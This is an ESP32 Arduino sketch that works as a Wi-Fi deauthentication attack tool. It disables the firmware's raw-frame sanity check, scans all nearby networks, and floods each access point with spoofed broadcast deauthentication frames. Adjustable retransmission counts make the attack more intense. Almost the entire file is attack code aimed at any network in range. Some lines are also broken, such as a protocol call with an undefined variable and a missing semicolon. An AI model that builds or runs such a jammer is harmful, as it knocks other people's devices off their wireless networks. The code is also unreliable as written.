extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Include Statements
// -----------------------------------------
#include "WiFi.h"
#include "esp_wifi.h"

// Constant Statements
// -----------------------------------------
// GPIO 2 CONSTANT
#define LED_PIN 2
// Wifi Base Channel Constant
#define BASE_CHAN 8

// Function Statements
// -----------------------------------------
void net_conf();
int scan_net(void);

// Variable Statements
// -------------------------------------------------------------------
// Global variables(initializing the wifi channel to 1 as default)
int wifi_channel = 1;
// Let's create an array which holds the channels we want to hop back in forth on.
// For this we will use: 1,3,6,10,11,14
// we need to check this before trying.
int ch_array[6] = {1, 3, 6, 10, 11, 14};

// Now we need to create a new variable for hopspeed. We set our pretty low for faster hops.
int hop_delay = 5;

int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int deauthPacketRetransmissions = 40; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets

// Configure the Network
// ------------------------------------------
void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);   // Turn off LED
  Serial.begin(115200);

  // Initialize WiFi in STA(station) mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Set configuration values
  wifi_country_t config = {
    .cc = "US",
    .schan = 1,
    .nchan = 11,
    .policy = WIFI_COUNTRY_POLICY_MANUAL,
  };
  WiFi.setTxPower(WIFI_POWER_19_5dBm);

  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B)

  Serial.println("Scanning for networks...");
}

void loop() {
  // Scan for networks
  int numNetworks = WiFi.scanNetworks();
  Serial.print("Networks found: ");
  Serial.println(numNetworks);

  for (int i = 0; i < numNetworks; ++i) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.BSSIDstr(i));
    Serial.print(") on channel ");
    Serial.println(WiFi.channel(i));

    // Set the correct channel for sending deauth frames
    esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);

    // Construct deauth frame
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,  // Frame Control (Deauth frame)
      0xFF, 0xFF,  // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast Destination MAC
      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
      0x00, 0x00  // Sequence Control
    };


    for (int r = 0; r < retransmissionSessions; ++r) {
      Serial.print("Starting retransmission session ");
      Serial.print(r + 1);
      Serial.print(" to network: ");
      Serial.println(WiFi.SSID(i));

      // Spam multiple deauth frames to increase effectiveness(Packet Loss Prevention)
      for (int j = 0; j < deauthPacketRetransmissions; ++j) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
        digitalWrite(LED_PIN, HIGH); 
        Serial.print("Deauth packet ");
        Serial.print(j + 1);
        Serial.print(" sent to network: ");
        Serial.println(WiFi.SSID(i));
        delay(send_delay); // Can reduce this further if desired(Prevents Overheating of the chip)
        digitalWrite(LED_PIN, LOW);  
      }
    }
  }
  delay(scan_delay); // delay between scans to prevent constant scanning overload
}
